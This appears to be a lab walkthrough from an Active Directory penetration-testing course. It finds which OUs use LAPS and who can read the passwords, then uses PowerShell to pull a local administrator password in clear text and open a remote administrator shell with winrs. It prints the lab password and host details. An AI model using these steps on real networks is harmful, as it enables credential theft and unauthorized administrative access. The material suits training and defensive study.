# HANDS ON 8:

```
  - Identify OUs where LAPS is in use and user(s) who have permission to read passwords.
  - Abuse the permissions to get the clear text password(s).
```

## Index of content

  1. [Identify LAPS](#identify-laps)
  2. [Abuse Permissions](#abuse-permissions)


## Identify LAPS

```
PS C:\Users\studentuser34> Import-Module 'C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1'
```

```
PS C:\Users\studentuser34> C:\AD\Tools\Get-LAPSPermissions.ps1

Read Rights

organizationalUnit                     IdentityReference
------------------                     -----------------
OU=MailMgmt,DC=us,DC=techcorp,DC=local US\studentusers

Write Rights

OU=MailMgmt,DC=us,DC=techcorp,DC=local NT AUTHORITY\SELF
```

## Abuse Permissions

Read credentials:
```
PS C:\Users\studentuser34> Get-ADComputer -Identity us-mailmgmt -Properties * | select ms-Mcs-AdmPwd

ms-Mcs-AdmPwd
-------------
rU2S;SUpb5z]WM
```

```
PS C:\Users\studentuser34> Get-AdmPwdPassword -ComputerName *

ComputerName         DistinguishedName                             Password           ExpirationTimestamp
------------         -----------------                             --------           -------------------
TECHCORP-DC          CN=TECHCORP-DC,OU=Domain Controllers,DC=te...                    1/1/0001 12:00:00 AM
US-DC                CN=US-DC,OU=Domain Controllers,DC=us,DC=te...                    1/1/0001 12:00:00 AM
US-EXCHANGE          CN=US-EXCHANGE,CN=Computers,DC=us,DC=techc...                    1/1/0001 12:00:00 AM
US-MGMT              CN=US-MGMT,OU=Mgmt,DC=us,DC=techcorp,DC=local                    1/1/0001 12:00:00 AM
US-HELPDESK          CN=US-HELPDESK,CN=Computers,DC=us,DC=techc...                    1/1/0001 12:00:00 AM
US-MSSQL             CN=US-MSSQL,CN=Computers,DC=us,DC=techcorp...                    1/1/0001 12:00:00 AM
US-MAILMGMT          CN=US-MAILMGMT,OU=MailMgmt,DC=us,DC=techco... rU2S;SUpb5z]WM     1/26/2023 3:52:19 AM
US-JUMP              CN=US-JUMP,OU=PAW,DC=us,DC=techcorp,DC=local                     1/1/0001 12:00:00 AM
US-WEB               CN=US-WEB,CN=Computers,DC=us,DC=techcorp,D...                    1/1/0001 12:00:00 AM
US-ADCONNECT         CN=US-ADCONNECT,CN=Computers,DC=us,DC=tech...                    1/1/0001 12:00:00 AM
EMPTEST              CN=EMPTEST,CN=Computers,DC=techcorp,DC=local                     1/1/0001 12:00:00 AM
jumpone              CN=jumpone,CN=Managed Service Accounts,DC=...                    1/1/0001 12:00:00 AM
STUDENT31            CN=STUDENT31,OU=Students,DC=us,DC=techcorp...                    1/1/0001 12:00:00 AM
STUDENT32            CN=STUDENT32,OU=Students,DC=us,DC=techcorp...                    1/1/0001 12:00:00 AM
STUDENT33            CN=STUDENT33,OU=Students,DC=us,DC=techcorp...                    1/1/0001 12:00:00 AM
STUDENT34            CN=STUDENT34,OU=Students,DC=us,DC=techcorp...                    1/1/0001 12:00:00 AM
STUDENT35            CN=STUDENT35,OU=Students,DC=us,DC=techcorp...                    1/1/0001 12:00:00 AM
STUDENT36            CN=STUDENT36,OU=Students,DC=us,DC=techcorp...                    1/1/0001 12:00:00 AM
STUDENT37            CN=STUDENT37,OU=Students,DC=us,DC=techcorp...                    1/1/0001 12:00:00 AM
STUDENT38            CN=STUDENT38,OU=Students,DC=us,DC=techcorp...                    1/1/0001 12:00:00 AM
STUDENT39            CN=STUDENT39,OU=Students,DC=us,DC=techcorp...                    1/1/0001 12:00:00 AM
STUDENT40            CN=STUDENT40,OU=Students,DC=us,DC=techcorp...                    1/1/0001 12:00:00 AM
STUDENT41            CN=STUDENT41,OU=Students,DC=us,DC=techcorp...                    1/1/0001 12:00:00 AM
STUDENT42            CN=STUDENT42,OU=Students,DC=us,DC=techcorp...                    1/1/0001 12:00:00 AM
STUDENT43            CN=STUDENT43,OU=Students,DC=us,DC=techcorp...                    1/1/0001 12:00:00 AM
STUDENT44            CN=STUDENT44,OU=Students,DC=us,DC=techcorp...                    1/1/0001 12:00:00 AM
STUDENT45            CN=STUDENT45,OU=Students,DC=us,DC=techcorp...                    1/1/0001 12:00:00 AM
STUDENT46            CN=STUDENT46,OU=Students,DC=us,DC=techcorp...                    1/1/0001 12:00:00 AM
STUDENT47            CN=STUDENT47,OU=Students,DC=us,DC=techcorp...                    1/1/0001 12:00:00 AM
STUDENT48            CN=STUDENT48,OU=Students,DC=us,DC=techcorp...                    1/1/0001 12:00:00 AM
STUDENT49            CN=STUDENT49,OU=Students,DC=us,DC=techcorp...                    1/1/0001 12:00:00 AM
STUDENT50            CN=STUDENT50,OU=Students,DC=us,DC=techcorp...                    1/1/0001 12:00:00 AM
```

Access with credentials:

```
PS C:\Users\studentuser34> winrs.exe -r:us-mailmgmt -u:".\administrator" -p:"rU2S;SUpb5z]WM" cmd
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>hostname
hostname
US-MailMgmt

C:\Users\Administrator>whoami
whoami
us-mailmgmt\administrator

C:\Users\Administrator>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::1535:49c1:b988:f332%11
   IPv4 Address. . . . . . . . . . . : 192.168.1.63
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.1.254
```
